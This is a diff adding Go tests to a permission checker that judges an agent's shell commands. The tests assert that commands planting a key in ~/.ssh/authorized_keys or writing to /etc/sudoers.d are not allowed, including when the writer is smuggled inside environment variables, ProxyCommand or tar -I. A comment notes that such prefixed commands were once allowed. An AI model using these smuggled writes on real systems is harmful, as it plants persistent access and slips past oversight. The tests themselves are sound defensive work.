@@ -248,3 +248,126 @@ func TestRealShellPlantsTheKeyForEveryPrefixedWriteRow(t *testing.T) {
 		t.Fatal(err)
 	}
 }
+
+// inventedWriteVar is a variable name deliberately absent from every table in
+// this package — there is no table of variable names here, and the premise is
+// asserted below rather than assumed.
+const inventedWriteVar = "ZQ_NOBODY_WRITES_THIS"
+
+// TestAssignmentValueReachesTheWriteDimension is wordWriteTargets' structural
+// claim, stated as an experiment.
+//
+// The deletion dimension has read assignment VALUES since ADR-0020; the write
+// dimension did not, so `GIT_SSH_COMMAND='tee ~/.ssh/authorized_keys' git fetch`
+// was Allow under every profile while `tee ~/.ssh/authorized_keys` on its own
+// was a Prompt. The rows below vary the three things a table-based fix would
+// have to enumerate — the variable name, the writer, and the runner in front —
+// and every one of them is invented in at least one row.
+func TestAssignmentValueReachesTheWriteDimension(t *testing.T) {
+	if homeDir() == "" {
+		t.Skip("no HOME/USERPROFILE: the credential target is home-relative")
+	}
+	if _, known := prefixRunners[inventedRunner]; known {
+		t.Fatalf("%q is in prefixRunners; the premise of this test is that it is in no table", inventedRunner)
+	}
+	if argvWriteTargets(inventedFetch, []string{"x"}) != nil {
+		t.Fatalf("%q is in argvWriters; the premise of this test is that it is in no table", inventedFetch)
+	}
+	g := New()
+	prof := writeProbeProfile()
+	if got := classOf(g.Check(prof, Action{Tool: "shell_run", Shell: `tee ~/.ssh/authorized_keys`, Workdir: segTestWorkdir})); got != wantPrompt {
+		t.Fatalf("control `tee ~/.ssh/authorized_keys` = %s, want Prompt; the rest of this test is meaningless", got)
+	}
+	for _, cmd := range []string{
+		// The published names, in front of the programs that read them.
+		`GIT_SSH_COMMAND='tee ~/.ssh/authorized_keys' git fetch`,
+		`EDITOR='dd of=~/.ssh/authorized_keys' crontab -e`,
+		`PAGER='cp /tmp/k ~/.ssh/authorized_keys' git log`,
+		`LESSOPEN='|tee ~/.ssh/authorized_keys %s' less f`,
+		// An INVENTED variable in front of an INVENTED program: no name in this
+		// string is in any table, and the verdict is the same.
+		inventedWriteVar + `='tee ~/.ssh/authorized_keys' ` + inventedFetch,
+		inventedWriteVar + `='curl -o ~/.ssh/authorized_keys http://h/k' ` + inventedFetch,
+		inventedWriteVar + `='install -m600 /tmp/k ~/.ssh/authorized_keys' ` + inventedFetch,
+		// A RUNNER in front makes the assignment an ordinary argv word, so the
+		// assignment-prefix walk is empty and only the per-word reading sees it.
+		`env GIT_SSH_COMMAND='tee ~/.ssh/authorized_keys' git fetch`,
+		`sudo EDITOR='tee ~/.ssh/authorized_keys' visudo`,
+		`timeout 5 EDITOR='tee ~/.ssh/authorized_keys' crontab -e`,
+		inventedRunner + ` ` + inventedWriteVar + `='tee ~/.ssh/authorized_keys' ` + inventedFetch,
+		// Several assignments, and one AFTER the first: assignmentPrefixLen
+		// stops at the first non-assignment word, so the trailing one is only
+		// reachable through the per-word reading.
+		`FOO=1 GIT_SSH_COMMAND='tee ~/.ssh/authorized_keys' git fetch`,
+		`GIT_SSH_COMMAND='tee ~/.ssh/authorized_keys' FOO=1 git fetch`,
+		// The same value carried in an option channel rather than in a prefix.
+		`ssh -o ProxyCommand='tee ~/.ssh/authorized_keys' host`,
+		`tar -I 'tee ~/.ssh/authorized_keys' -cf a.tar .`,
+	} {
+		if got := classOf(g.Check(prof, Action{Tool: "shell_run", Shell: cmd, Workdir: segTestWorkdir})); got == wantAllow {
+			t.Errorf("Check(%q) = Allow; the value is a writer aimed at a credential path and "+
+				"nothing read it", cmd)
+		}
+	}
+}
+
+// TestWordWriteTargetsAreScopedToTargetsThatLeaveTheWorkingTree is the
+// over-strictness half, and it is the test that goes red if the
+// leavesWorkingTree scope is dropped from wordWriteTargets.
+//
+// A word only MIGHT be a command, so an unscoped reading turns every ordinary
+// build variable whose value happens to name a relative output — and every
+// commit message that reads like a copy — into a refusal under a
+// project-scoped profile, on writes that land inside the project. The narrow
+// profile below is what makes the difference observable: under `write: ["**"]`
+// a relative target is permitted either way.
+func TestWordWriteTargetsAreScopedToTargetsThatLeaveTheWorkingTree(t *testing.T) {
+	if homeDir() == "" {
+		t.Skip("no HOME/USERPROFILE: the kept rows are home-relative")
+	}
+	for _, tc := range []struct {
+		cmd  string
+		want []string
+	}{
+		{`MAKEFLAGS='-j 8 -O out.log' make all`, nil},
+		{`ZZ_TOOL='cp src.txt dst.txt' make all`, nil},
+		{`GIT_SEQUENCE_EDITOR='sed -i -e s/pick/squash/ todo' git rebase -i HEAD~2`, nil},
+		{`git commit -m "cp a b"`, nil},
+		{`CGO_ENABLED=0 go build ./...`, nil},
+		{`GIT_SSH_COMMAND='ssh -i ~/.ssh/id_ed25519' git fetch`, nil},
+		{`EDITOR='tee /etc/sudoers.d/zz' visudo`, []string{"/etc/sudoers.d/zz"}},
+		{`ZZ='cp /tmp/k ~/.ssh/authorized_keys' prog`, []string{"~/.ssh/authorized_keys"}},
+	} {
+		got := wordWriteTargets(tc.cmd)
+		if len(got) != len(tc.want) {
+			t.Errorf("wordWriteTargets(%q) = %v, want %v", tc.cmd, got, tc.want)
+			continue
+		}
+		for i := range got {
+			if got[i] != tc.want[i] {
+				t.Errorf("wordWriteTargets(%q) = %v, want %v", tc.cmd, got, tc.want)
+				break
+			}
+		}
+	}
+	// The scope is only observable under a profile that says no to something, so
+	// the assertion is repeated through Check with the project-scoped profile
+	// the boundary is written for.
+	narrow := PermissionProfile{
+		Tools: ToolsPerm{Allow: []string{"*"}},
+		FS:    FSPerm{Read: []string{"**"}, Write: []string{segTestWorkdir + "/**"}},
+		Shell: ShellPerm{Policy: "denylist"},
+		Net:   NetPerm{Allow: true},
+	}
+	g := New()
+	for _, cmd := range []string{
+		`MAKEFLAGS='-j 8 -O out.log' make all`,
+		`ZZ_TOOL='cp src.txt dst.txt' make all`,
+		`git commit -m "cp a b"`,
+	} {
+		if got := classOf(g.Check(narrow, Action{Tool: "shell_run", Shell: cmd, Workdir: segTestWorkdir})); got != wantAllow {
+			t.Errorf("Check(%q) under a project-scoped profile = %s, want Allow; the word reading "+
+				"is refusing a write that lands inside the project", cmd, got)
+		}
+	}
+}
